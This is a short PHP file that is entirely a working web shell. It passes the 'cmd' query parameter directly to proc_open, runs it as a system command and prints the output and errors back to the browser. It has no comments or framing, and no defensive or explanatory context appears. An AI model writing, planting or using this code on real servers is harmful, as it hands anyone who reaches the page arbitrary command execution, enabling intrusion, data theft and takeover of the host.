<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_GET['cmd'])) {
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $process = proc_open($_GET['cmd'], $descriptors, $pipes);
    if (is_resource($process)) {
        echo "<pre>";
        echo stream_get_contents($pipes[1]);
        echo stream_get_contents($pipes[2]);
        echo "</pre>";
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    else {
        echo "Failed to open process.";
    }
}
else {
    echo "Ready.";
}
?>